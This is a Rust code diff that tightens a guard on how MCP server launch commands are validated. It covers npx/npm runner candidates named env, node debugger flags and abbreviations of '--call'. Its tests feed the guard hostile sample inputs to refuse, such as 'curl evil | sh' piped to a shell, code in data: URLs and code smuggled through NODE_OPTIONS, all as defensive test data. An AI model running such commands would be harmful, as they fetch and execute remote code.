@@ -901,7 +901,14 @@ fn check_launch_chain(
         // over-refusal the guard accepts.
         //
         // Each candidate is a slice of the arguments and is descended into
-        // before the next one is looked at: nothing is copied per candidate.
+        // before the next one is looked at. A candidate costs one allocation
+        // for its program name. A candidate named `env` copies the arguments
+        // behind it to read them: `env_command_list` copies them once, plus
+        // one copy per `-S` split, up to `MAX_ENV_SPLITS`. A candidate that is
+        // not skipped is copied again by `env_child`. A skipped candidate does
+        // not use the program budget. The cost stays bounded by
+        // `MAX_LAUNCH_ARGS` and `MAX_ENV_SPLITS`, since the runner's own
+        // arguments are capped at `MAX_LAUNCH_ARGS` on entry.
         let end = package_runner_separator(program, args).unwrap_or(args.len());
         // npm's arguments open with its own subcommand, so the candidates
         // are looked for behind it; `npx` has no subcommand of its own.
@@ -914,6 +921,23 @@ fn check_launch_chain(
                 continue;
             }
             let candidate = package_program(&args[index]);
+            // A candidate is usually a package, and npm installs a package
+            // called `env` rather than run GNU `env`. But npx runs a binary
+            // it finds in the global bin directory, so a candidate named
+            // `env` can be GNU `env`. A path that ends in `env` (a virtual
+            // environment, `--prefix /srv/app/env`) is not GNU `env` by its
+            // name. It is skipped in two cases. Either the arguments behind it
+            // are read in full and name no program, or they cannot be read and
+            // no later word is a `-S` or `NAME=value` form. In
+            // `npx --prefix /srv/app/env -y pkg`, GNU `env` would stop at `-y`,
+            // an option it does not know, so the guard cannot read the words
+            // behind it. Every plain word is checked as a
+            // candidate of its own, `pkg` included. The entry is accepted
+            // because no `-S` or `NAME=value` word follows. Any other `env`
+            // candidate is read as `env`.
+            if candidate == "env" && env_known_to_run_nothing(&args[index + 1..end]) {
+                continue;
+            }
             check_launch_chain(&candidate, &args[index + 1..end], depth + 1, budget)?;
         }
         // The program behind the `--` is the one the runner was asked to
@@ -974,6 +998,46 @@ fn env_child(program: &str, args: &[String]) -> Result<Vec<(String, Vec<String>)
         }
     }
     Ok(vec![(child, child_args)])
+}
+
+/// Whether an `env` given `args` runs no program, as far as the guard can read the arguments.
+///
+/// True when the arguments are read in full and name no program: none at
+/// all, or only assignments. When they cannot be read (an option the guard
+/// does not know, a `-S` string it cannot split, more nested `-S` than it
+/// follows), `env` may still run a program, so the answer is true only if no
+/// `-S` word and no `NAME=value` word follows. A plain word is not checked
+/// here: the candidate loop checks every plain word as a candidate of its own.
+/// A `-S` word assembles a program from words that are not candidates, and an
+/// assignment changes the environment of the next program, so either one could
+/// hand `env` a program the loop never sees.
+fn env_known_to_run_nothing(args: &[String]) -> bool {
+    match env_command_list(args) {
+        Some(command) => env_program_and_args(&command).is_none(),
+        None => !args
+            .iter()
+            .any(|arg| env_split_string_word(arg) || env_assignment_word(arg)),
+    }
+}
+
+/// Whether an argument may be `env`'s `-S`/`--split-string` option: `--split-string`
+/// or any prefix of it, with or without a value, or a short cluster that
+/// holds an `S` (`-S`, `-Sx`, `-iS`). A cluster that only looks like one is
+/// read as one: the answer is used to refuse.
+fn env_split_string_word(arg: &str) -> bool {
+    match arg.strip_prefix("--") {
+        Some(body) => {
+            let name = body.split('=').next().unwrap_or_default();
+            !name.is_empty() && "split-string".starts_with(name)
+        }
+        None => arg.starts_with('-') && arg.contains('S'),
+    }
+}
+
+/// Whether an argument is a `NAME=value` word that `env` would set for the
+/// program behind it. An option with an attached value (`--root=/srv`) is not.
+fn env_assignment_word(arg: &str) -> bool {
+    !arg.starts_with('-') && is_env_assignment(arg)
 }
 
 /// The program a package spec runs: its last path segment without the
@@ -1554,7 +1618,8 @@ fn fish_inline_flag(arg: &str) -> Option<String> {
 /// with the code attached (`-p1+1`); `--eval`/`--print` are their long
 /// forms, with the value attached (`--eval=code`) or not. `--import`,
 /// `--require`, `-r` and the loader flags hand node a module to run; a
-/// module given as a `data:` URL is code with no file behind it.
+/// module given as a `data:` URL is code with no file behind it. The
+/// debugger flags open a port that takes code (see [`node_debugger_flag`]).
 fn node_inline_flag(arg: &str, next: Option<&String>) -> Option<String> {
     if short_option_carries_letter(arg, &['e', 'p'], NODE_VALUE_LETTERS) {
         return Some(arg.to_string());
@@ -1563,8 +1628,26 @@ fn node_inline_flag(arg: &str, next: Option<&String>) -> Option<String> {
         "--eval" | "--print" => Some(arg.to_string()),
         other if other.starts_with("--eval=") => Some("--eval".to_string()),
         other if other.starts_with("--print=") => Some("--print".to_string()),
-        _ => node_module_flag(arg, next),
+        _ => node_debugger_flag(arg).or_else(|| node_module_flag(arg, next)),
     }
+}
+
+/// The description of the node flag that opens a debugger port, if `arg` is
+/// `--inspect`, `--inspect-brk` or `--inspect-wait`, with or without
+/// `=host:port`: the flag's name and the reason it is refused, for the
+/// message that names it.
+///
+/// The inspector takes commands over a socket: with a host such as
+/// `0.0.0.0` it hands code execution to whoever can reach the port. Node
+/// reads `_` in the name as `-`. The flags that only set the port a
+/// debugger would use (`--inspect-port`) open nothing and are left alone.
+fn node_debugger_flag(arg: &str) -> Option<String> {
+    let name = arg.split('=').next()?.replace('_', "-");
+    matches!(
+        name.as_str(),
+        "--inspect" | "--inspect-brk" | "--inspect-wait"
+    )
+    .then(|| format!("{name}, which opens a debugger port"))
 }
 
 /// The node flag that loads a module, if `arg` is `--import`, `--require`,
@@ -1693,17 +1776,19 @@ fn is_python_program(program: &str) -> bool {
 /// The `npx`/`npm exec` flag that runs a command instead of a package: `-c`,
 /// alone or in a cluster (`-yc`), and `--call`.
 ///
-/// The abbreviations `--ca` and `--cal` are refused as well. npm does not
-/// necessarily resolve them to `--call` (`npx --cal 'echo x'` reads the
-/// command as a package name, and npm has an option named exactly `--ca`),
-/// so this is a conservative over-refusal, not a claim about npm.
+/// npm resolves `--c` to `--call` (`npx --c 'echo x'` runs the command), so
+/// it is refused. The longer abbreviations `--ca` and `--cal` are refused as
+/// well. npm does not necessarily resolve them to `--call` (`npx --cal 'echo
+/// x'` reads the command as a package name, and npm has an option named
+/// exactly `--ca`), so those are a conservative over-refusal, not a claim
+/// about npm.
 fn package_runner_call(arg: &str) -> Option<String> {
     if short_option_carries_letter(arg, &['c'], RUNNER_VALUE_LETTERS) {
         return Some(arg.to_string());
     }
     let long = arg.strip_prefix("--")?;
     match long.split('=').next()? {
-        "ca" | "cal" | "call" => Some("--call".to_string()),
+        "c" | "ca" | "cal" | "call" => Some("--call".to_string()),
         _ => None,
     }
 }
@@ -1776,8 +1861,9 @@ fn node_options_tokens(value: &str) -> Vec<String> {
 ///
 /// `NODE_OPTIONS` is read as node's own command line, so the rules of the
 /// `node` interpreter apply: `-e`/`--eval`/`-p`/`--print` (node refuses them
-/// in `NODE_OPTIONS`, and they are refused here anyway) and a `data:` module
-/// behind `--import`, `--require`, `-r` or a loader flag. The value is split
+/// in `NODE_OPTIONS`, and they are refused here anyway), a `data:` module
+/// behind `--import`, `--require`, `-r` or a loader flag, and the debugger
+/// flags `--inspect`, `--inspect-brk` and `--inspect-wait`. The value is split
 /// the way node splits it (see [`node_options_tokens`]). A module that is a
 /// file is a program being run and is left alone.
 ///
@@ -4007,9 +4093,12 @@ mod tests {
         }
     }
 
-    /// Assert that the launch rule refuses `command` with `args` as an inline
-    /// script, with a 400 that says so.
-    fn assert_launch_refused(command: &str, args: &[String]) {
+    /// Assert that the launch rule refuses `command` with `args` with a 400
+    /// whose detail holds `reason`. The refusals for a chain that is too
+    /// complex and for a program that cannot be resolved also say "inline
+    /// script", so a reason names what the case is refused for: the flag, or
+    /// the part of the message only that refusal has.
+    fn assert_launch_refused(command: &str, args: &[String], reason: &str) {
         let err = match validate_mcp_launch(command, args) {
             Ok(()) => panic!("{command} {args:?} must be refused"),
             Err(err) => err,
@@ -4018,8 +4107,8 @@ mod tests {
         assert_eq!(status, StatusCode::BAD_REQUEST, "{command} {args:?}");
         let detail = body.0["detail"].as_str().unwrap_or_default();
         assert!(
-            detail.contains("inline script"),
-            "{command} {args:?} must say why: {detail}"
+            detail.contains(reason),
+            "{command} {args:?} must be refused for {reason:?}: {detail}"
         );
     }
 
@@ -4154,7 +4243,13 @@ mod tests {
                 strings(&["-y", "pkg", "node", "-e", "console.log(1)"]),
             ),
         ] {
-            assert_launch_refused(command, &args);
+            // The refusal names the flag the program behind the option got.
+            let flag = if args.iter().any(|arg| arg == "-c") {
+                "(-c)"
+            } else {
+                "(-e)"
+            };
+            assert_launch_refused(command, &args, flag);
         }
     }
 
@@ -4201,7 +4296,13 @@ mod tests {
                 strings(&["-C", "/tmp", "x", "node", "-e", "console.log(1)"]),
             ),
         ] {
-            assert_launch_refused(command, &args);
+            // The refusal names the flag the program behind the option got.
+            let flag = if args.iter().any(|arg| arg == "-c") {
+                "(-c)"
+            } else {
+                "(-e)"
+            };
+            assert_launch_refused(command, &args, flag);
         }
     }
 
@@ -4211,14 +4312,16 @@ mod tests {
     /// newline inside it.
     #[test]
     fn validate_mcp_launch_refuses_a_node_loader_given_a_data_url() {
-        for (command, args) in [
+        for (command, args, flag) in [
             (
                 "node",
                 strings(&["--loader", "data:text/javascript,console.log(1)"]),
+                "(--loader)",
             ),
             (
                 "node",
                 strings(&["--loader=data:text/javascript,console.log(1)"]),
+                "(--loader)",
             ),
             (
                 "node",
@@ -4226,47 +4329,57 @@ mod tests {
                     "--experimental-loader",
                     "data:text/javascript,console.log(1)",
                 ]),
+                "(--experimental-loader)",
             ),
             (
                 "node",
                 strings(&["--experimental-loader=data:text/javascript,console.log(1)"]),
+                "(--experimental-loader)",
             ),
             // Node reads `_` in an option name as `-`.
             (
                 "node",
                 strings(&["--experimental_loader=data:text/javascript,console.log(1)"]),
+                "(--experimental-loader)",
             ),
             (
                 "node",
                 strings(&["--import", "DATA:text/javascript,console.log(1)"]),
+                "(--import)",
             ),
             (
                 "node",
                 strings(&["--import=Data:text/javascript,console.log(1)"]),
+                "(--import)",
             ),
             (
                 "node",
                 strings(&["--require=DATA:text/javascript,console.log(1)"]),
+                "(--require)",
             ),
             (
                 "node",
                 strings(&["-r", "DATA:text/javascript,console.log(1)"]),
+                "(-r)",
             ),
             (
                 "node",
                 strings(&["--import", " data:text/javascript,console.log(1)"]),
+                "(--import)",
             ),
             (
                 "node",
                 strings(&["--import", "da\nta:text/javascript,console.log(1)"]),
+                "(--import)",
             ),
             // Behind a package runner it is the same node.
             (
                 "npx",
                 strings(&["-y", "node", "--loader=data:text/javascript,console.log(1)"]),
+                "(--loader)",
             ),
         ] {
-            assert_launch_refused(command, &args);
+            assert_launch_refused(command, &args, flag);
         }
     }
 
@@ -4290,26 +4403,290 @@ mod tests {
         }
     }
 
-    /// npx reads `-c` out of a short-option cluster. The abbreviations of
-    /// `--call` are refused conservatively.
+    /// `--inspect`, `--inspect-brk` and `--inspect-wait` open a debugger port,
+    /// and with `=0.0.0.0:9229` the port takes commands from the network. They
+    /// are refused on the command line of `node`, behind a runner or `env`,
+    /// and with the host and port attached.
+    #[test]
+    fn validate_mcp_launch_refuses_a_node_debugger_flag() {
+        for (command, args, flag) in [
+            ("node", strings(&["--inspect", "server.js"]), "--inspect"),
+            (
+                "node",
+                strings(&["--inspect=0.0.0.0:9229", "server.js"]),
+                "--inspect",
+            ),
+            (
+                "node",
+                strings(&["--inspect-brk", "server.js"]),
+                "--inspect-brk",
+            ),
+            (
+                "node",
+                strings(&["--inspect-brk=127.0.0.1:9229", "server.js"]),
+                "--inspect-brk",
+            ),
+            (
+                "node",
+                strings(&["--inspect-wait", "server.js"]),
+                "--inspect-wait",
+            ),
+            (
+                "node",
+                strings(&["--inspect-wait=0.0.0.0:9229", "server.js"]),
+                "--inspect-wait",
+            ),
+            // Node reads `_` in an option name as `-`.
+            (
+                "node",
+                strings(&["--inspect_brk=0.0.0.0:9229", "server.js"]),
+                "--inspect-brk",
+            ),
+            ("node", strings(&["server.js", "--inspect"]), "--inspect"),
+            (
+                "npx",
+                strings(&["-y", "node", "--inspect=0.0.0.0:9229", "server.js"]),
+                "--inspect",
+            ),
+            (
+                "env",
+                strings(&["node", "--inspect-brk", "server.js"]),
+                "--inspect-brk",
+            ),
+        ] {
+            assert_launch_refused(
+                command,
+                &args,
+                &format!("({flag}, which opens a debugger port)"),
+            );
+        }
+    }
+
+    /// A `node` entry with options that do not open a debugger port is a
+    /// program being run.
+    #[test]
+    fn validate_mcp_launch_accepts_a_node_entry_without_a_debugger_flag() {
+        for (command, args) in [
+            ("node", strings(&["server.js"])),
+            (
+                "node",
+                strings(&["--max-old-space-size=4096", "server.js", "--port", "3000"]),
+            ),
+        ] {
+            assert!(
+                validate_mcp_launch(command, &args).is_ok(),
+                "{command} {args:?} must be accepted"
+            );
+        }
+    }
+
+    /// `NODE_OPTIONS` is read as node's own command line, so a debugger flag
+    /// in it is refused in an entry's `env` map and in the assignments of an
+    /// `env` command.
+    #[test]
+    fn validate_mcp_refuses_a_node_debugger_flag_in_node_options() {
+        for value in [
+            "--inspect",
+            "--inspect=0.0.0.0:9229",
+            "--inspect-brk",
+            "--inspect-brk=0.0.0.0:9229",
+            "--inspect-wait",
+            "--inspect-wait=0.0.0.0:9229",
+            "--max-old-space-size=4096 --inspect=0.0.0.0:9229",
+        ] {
+            let mut env = HashMap::new();
+            env.insert("NODE_OPTIONS".to_string(), value.to_string());
+            let err = match validate_mcp_env(&env) {
+                Ok(()) => panic!("NODE_OPTIONS={value} must be refused"),
+                Err(err) => err,
+            };
+            let (status, body) = err;
+            assert_eq!(status, StatusCode::BAD_REQUEST, "NODE_OPTIONS={value}");
+            let detail = body.0["detail"].as_str().unwrap_or_default();
+            assert!(
+                detail.contains("NODE_OPTIONS") && detail.contains("opens a debugger port"),
+                "NODE_OPTIONS={value} must say why: {detail}"
+            );
+
+            let assignment = format!("NODE_OPTIONS={value}");
+            assert_launch_refused(
+                "env",
+                &strings(&[assignment.as_str(), "node", "server.js"]),
+                "opens a debugger port",
+            );
+        }
+        // Options that only tune node are an operator's setting.
+        let mut env = HashMap::new();
+        env.insert(
+            "NODE_OPTIONS".to_string(),
+            "--max-old-space-size=4096".to_string(),
+        );
+        assert!(validate_mcp_env(&env).is_ok());
+    }
+
+    /// A runner's candidate named `env` can be GNU `env`, because npx runs a
+    /// binary it finds in the global bin directory. The test covers the cases
+    /// where no program is named behind `env`, or the arguments cannot be read
+    /// and hold no `-S` or `NAME=value` word, so each plain word is checked as
+    /// a candidate of its own (`pkg` in `--prefix /srv/app/env -y pkg`). The
+    /// directory of a virtual environment and a value that ends in `env` are
+    /// accepted, whether the value is the package's own argument or an option's
+    /// value.
+    #[test]
+    fn validate_mcp_launch_accepts_a_runner_argument_that_ends_in_env() {
+        for (command, args) in [
+            (
+                "npx",
+                strings(&[
+                    "-y",
+                    "@modelcontextprotocol/server-filesystem",
+                    "/srv/data/env",
+                ]),
+            ),
+            ("npx", strings(&["--prefix", "/srv/app/env", "-y", "pkg"])),
+            ("npx", strings(&["-y", "pkg", "--root", "/srv/app/env"])),
+            // An option with an attached value is not an assignment.
+            (
+                "npx",
+                strings(&["--prefix", "/srv/app/env", "-y", "pkg", "--root=/srv/app"]),
+            ),
+            (
+                "npm",
+                strings(&["exec", "--prefix", "/srv/app/env", "-y", "pkg"]),
+            ),
+        ] {
+            assert!(
+                validate_mcp_launch(command, &args).is_ok(),
+                "{command} {args:?} must be accepted"
+            );
+        }
+    }
+
+    /// A candidate named `env` is skipped in two cases: its arguments are read
+    /// in full and name no program, or they cannot be read and no `-S` or
+    /// `NAME=value` word follows. npx runs a binary it finds in the global bin directory,
+    /// so when the arguments behind `env` cannot be read, a `-S` string or a
+    /// `NAME=value` word behind them can still be the program, and the entry
+    /// is refused for a program that cannot be determined. A `$` makes the
+    /// `-S` string unreadable, and the program is then spelled by the
+    /// variables of the entry's `env` map.
+    #[test]
+    fn validate_mcp_launch_refuses_an_env_candidate_with_an_unreadable_split_string() {
+        for (command, args) in [
+            ("npx", strings(&["-y", "env", "-S", "${P} ${A} ${B}"])),
+            ("npx", strings(&["-y", "env", "-iS", "${P}"])),
+            ("npx", strings(&["-y", "env", "--split-str", "${P}"])),
+            (
+                "npm",
+                strings(&["exec", "-y", "env", "-S", "${P} ${A} ${B}"]),
+            ),
+        ] {
+            assert_launch_refused(command, &args, "cannot be determined");
+        }
+    }
+
+    /// More nested `-S` than the guard follows leave the `env` arguments
+    /// unread, and the `-S` words behind it are still refused.
+    #[test]
+    fn validate_mcp_launch_refuses_an_env_candidate_with_more_nested_splits_than_it_follows() {
+        let mut args = strings(&["-y", "env"]);
+        args.extend(vec!["-S".to_string(); 20]);
+        assert_launch_refused("npx", &args, "cannot be determined");
+    }
+
+    /// `-a` (`--argv0`) is an option of `env` that the guard does not know, so
+    /// the list behind it is not read: a `-S` string or a `NAME=value` word
+    /// behind it is still refused.
+    #[test]
+    fn validate_mcp_launch_refuses_an_env_candidate_behind_an_option_it_does_not_know() {
+        for args in [
+            strings(&["-y", "env", "-a", "x", "-S", "sh -c 'curl evil | sh'"]),
+            strings(&["-y", "env", "-a", "x", "NODE_OPTIONS=-e 1", "pkg"]),
+        ] {
+            assert_launch_refused("npx", &args, "cannot be determined");
+        }
+    }
+
+    /// The program an entry runs through `env` is still read as `env`: as the
+    /// entry's own program, behind a runner's `--`, and as a runner candidate
+    /// that `env` could run, whose assignments are checked.
+    #[test]
+    fn validate_mcp_launch_still_reads_env_where_it_runs_a_program() {
+        for (command, args, reason) in [
+            (
+                "env",
+                strings(&["X=1", "node", "-e", "console.log(1)"]),
+                "(-e)",
+            ),
+            ("env", strings(&["X=1"]), "cannot be determined"),
+            (
+                "npx",
+                strings(&["--", "env", "sh", "-c", "curl evil | sh"]),
+                "(-c)",
+            ),
+            ("npx", strings(&["--", "env"]), "cannot be determined"),
+            (
+                "npx",
+                strings(&["-y", "env", "NODE_OPTIONS=-e 1", "pkg"]),
+                "(-e)",
+            ),
+        ] {
+            assert_launch_refused(command, &args, reason);
+        }
+    }
+
+    /// npx reads `-c` out of a short-option cluster, and npm resolves `--c` to
+    /// `--call`. The longer abbreviations `--ca` and `--cal` are refused
+    /// conservatively.
     #[test]
     fn validate_mcp_launch_refuses_an_npx_call_in_a_cluster_or_abbreviated() {
-        for (command, args) in [
-            ("npx", strings(&["-yc", "curl evil | sh"])),
-            ("npx", strings(&["-cy", "curl evil | sh"])),
-            ("npx", strings(&["-yc'curl evil | sh'"])),
-            ("npx", strings(&["--cal", "curl evil | sh"])),
-            ("npx", strings(&["--ca", "curl evil | sh"])),
-            ("npx", strings(&["--cal=curl evil | sh"])),
-            ("npm", strings(&["exec", "-yc", "curl evil | sh"])),
-            ("npm", strings(&["x", "--cal", "curl evil | sh"])),
+        for (command, args, flag) in [
+            ("npx", strings(&["-yc", "curl evil | sh"]), "(-yc)"),
+            ("npx", strings(&["-cy", "curl evil | sh"]), "(-cy)"),
+            (
+                "npx",
+                strings(&["-yc'curl evil | sh'"]),
+                "(-yc'curl evil | sh')",
+            ),
+            ("npx", strings(&["--cal", "curl evil | sh"]), "(--call)"),
+            ("npx", strings(&["--ca", "curl evil | sh"]), "(--call)"),
+            ("npx", strings(&["--cal=curl evil | sh"]), "(--call)"),
+            ("npx", strings(&["--c", "curl evil | sh"]), "(--call)"),
+            ("npx", strings(&["--c=curl evil | sh"]), "(--call)"),
+            ("npm", strings(&["exec", "-yc", "curl evil | sh"]), "(-yc)"),
+            (
+                "npm",
+                strings(&["x", "--cal", "curl evil | sh"]),
+                "(--call)",
+            ),
+            (
+                "npm",
+                strings(&["exec", "--c", "curl evil | sh"]),
+                "(--call)",
+            ),
+            ("npm", strings(&["x", "--c=curl evil | sh"]), "(--call)"),
             // In nopt `-p` is `--parseable`, a flag with no value, so the
             // `c` behind it is `-c`; only an exact `-p` is `--package`.
-            ("npx", strings(&["-pc", "curl evil | sh"])),
-            ("npx", strings(&["-pcowsay", "cowsay"])),
-            ("npm", strings(&["exec", "-pc", "curl evil | sh"])),
+            ("npx", strings(&["-pc", "curl evil | sh"]), "(-pc)"),
+            ("npx", strings(&["-pcowsay", "cowsay"]), "(-pcowsay)"),
+            ("npm", strings(&["exec", "-pc", "curl evil | sh"]), "(-pc)"),
         ] {
-            assert_launch_refused(command, &args);
+            assert_launch_refused(command, &args, flag);
+        }
+    }
+
+    /// An option that merely starts with `--c` (`--cache`, `--config`) is not
+    /// the call flag.
+    #[test]
+    fn validate_mcp_launch_accepts_a_runner_option_that_only_starts_like_call() {
+        for (command, args) in [
+            ("npx", strings(&["--cache", "/tmp/cache", "-y", "pkg"])),
+            ("npx", strings(&["-y", "pkg", "--config", "app.json"])),
+        ] {
+            assert!(
+                validate_mcp_launch(command, &args).is_ok(),
+                "{command} {args:?} must be accepted"
+            );
         }
     }
 
@@ -4455,28 +4832,60 @@ mod tests {
     /// the cluster, is still the flag.
     #[test]
     fn validate_mcp_launch_still_finds_an_inline_flag_behind_a_short_option_value() {
-        for (command, args) in [
-            ("python", strings(&["-Wignore", "-c", "print(1)"])),
-            ("python", strings(&["-Xdev", "-c", "print(1)"])),
-            ("python", strings(&["-Sc", "print(1)"])),
-            ("perl", strings(&["-I/home/user_a/lib", "-e", "print 1"])),
-            ("perl", strings(&["-MPOSIX", "-e", "print 1"])),
-            ("perl", strings(&["-wle", "print 1"])),
-            ("ruby", strings(&["-rbundler/setup", "-e", "puts 1"])),
-            ("ruby", strings(&["-rx", "-e", "puts 1"])),
-            ("ruby", strings(&["-I/home/user_a/lib", "-e", "puts 1"])),
-            ("node", strings(&["-r", "dotenv/config", "-e", "1"])),
-            ("node", strings(&["-rdotenv/config", "-e", "1"])),
-            ("node", strings(&["-r", "x", "-e", "console.log(1)"])),
-            ("node", strings(&["-pe", "1"])),
+        for (command, args, flag) in [
+            ("python", strings(&["-Wignore", "-c", "print(1)"]), "(-c)"),
+            ("python", strings(&["-Xdev", "-c", "print(1)"]), "(-c)"),
+            ("python", strings(&["-Sc", "print(1)"]), "(-Sc)"),
+            (
+                "perl",
+                strings(&["-I/home/user_a/lib", "-e", "print 1"]),
+                "(-e)",
+            ),
+            ("perl", strings(&["-MPOSIX", "-e", "print 1"]), "(-e)"),
+            ("perl", strings(&["-wle", "print 1"]), "(-wle)"),
+            (
+                "ruby",
+                strings(&["-rbundler/setup", "-e", "puts 1"]),
+                "(-e)",
+            ),
+            ("ruby", strings(&["-rx", "-e", "puts 1"]), "(-e)"),
+            (
+                "ruby",
+                strings(&["-I/home/user_a/lib", "-e", "puts 1"]),
+                "(-e)",
+            ),
+            ("node", strings(&["-r", "dotenv/config", "-e", "1"]), "(-e)"),
+            ("node", strings(&["-rdotenv/config", "-e", "1"]), "(-e)"),
+            (
+                "node",
+                strings(&["-r", "x", "-e", "console.log(1)"]),
+                "(-e)",
+            ),
+            ("node", strings(&["-pe", "1"]), "(-pe)"),
             // Perl builds `use <spec> ;` out of a `-M`/`-m` argument, so
             // anything but a module name before the `=` is code.
-            ("perl", strings(&["-Mstrict;print(1)", "server.pl"])),
-            ("perl", strings(&["-MPOSIX(print(1))", "server.pl"])),
-            ("perl", strings(&["-mstrict;print(1)", "server.pl"])),
-            ("perl", strings(&["-wMstrict;print(1)", "server.pl"])),
+            (
+                "perl",
+                strings(&["-Mstrict;print(1)", "server.pl"]),
+                "(-Mstrict;print(1))",
+            ),
+            (
+                "perl",
+                strings(&["-MPOSIX(print(1))", "server.pl"]),
+                "(-MPOSIX(print(1)))",
+            ),
+            (
+                "perl",
+                strings(&["-mstrict;print(1)", "server.pl"]),
+                "(-mstrict;print(1))",
+            ),
+            (
+                "perl",
+                strings(&["-wMstrict;print(1)", "server.pl"]),
+                "(-wMstrict;print(1))",
+            ),
         ] {
-            assert_launch_refused(command, &args);
+            assert_launch_refused(command, &args, flag);
         }
     }
 
@@ -4485,7 +4894,7 @@ mod tests {
     /// own `env`.
     #[test]
     fn validate_mcp_launch_refuses_an_env_assignment_that_carries_code() {
-        for (command, args) in [
+        for (command, args, flag) in [
             (
                 "env",
                 strings(&[
@@ -4494,6 +4903,7 @@ mod tests {
                     "-y",
                     "pkg",
                 ]),
+                "(--import)",
             ),
             (
                 "env",
@@ -4502,18 +4912,22 @@ mod tests {
                     "node",
                     "server.js",
                 ]),
+                "(--require)",
             ),
             (
                 "env",
                 strings(&["NODE_OPTIONS=--eval=console.log(1)", "npx", "-y", "pkg"]),
+                "(--eval)",
             ),
             (
                 "env",
                 strings(&["-", "NODE_OPTIONS=-p 1", "npx", "-y", "pkg"]),
+                "(-p)",
             ),
             (
                 "env",
                 strings(&["PERL5OPT=-Mstrict;print(1)", "perl", "server.pl"]),
+                "(-Mstrict;print(1))",
             ),
             // The quoting is node's: a backslash inside quotes is literal.
             (
@@ -4524,6 +4938,7 @@ mod tests {
                     "-y",
                     "pkg",
                 ]),
+                "(--import)",
             ),
             (
                 "env",
@@ -4533,9 +4948,14 @@ mod tests {
                     "-y",
                     "pkg",
                 ]),
+                "(--import)",
             ),
             // The name is read the way the launcher reads it, not by case.
-            ("env", strings(&["node_options=-e 1", "npx", "-y", "pkg"])),
+            (
+                "env",
+                strings(&["node_options=-e 1", "npx", "-y", "pkg"]),
+                "(-e)",
+            ),
             // `-S` splits one string into the assignments and the program.
             (
                 "env",
@@ -4543,6 +4963,7 @@ mod tests {
                     "-S",
                     "NODE_OPTIONS=--import=data:text/javascript,console.log(1) npx -y pkg",
                 ]),
+                "(--import)",
             ),
             // A nested `env` has its own assignments.
             (
@@ -4554,9 +4975,10 @@ mod tests {
                     "-y",
                     "pkg",
                 ]),
+                "(--import)",
             ),
         ] {
-            assert_launch_refused(command, &args);
+            assert_launch_refused(command, &args, flag);
         }
     }
 
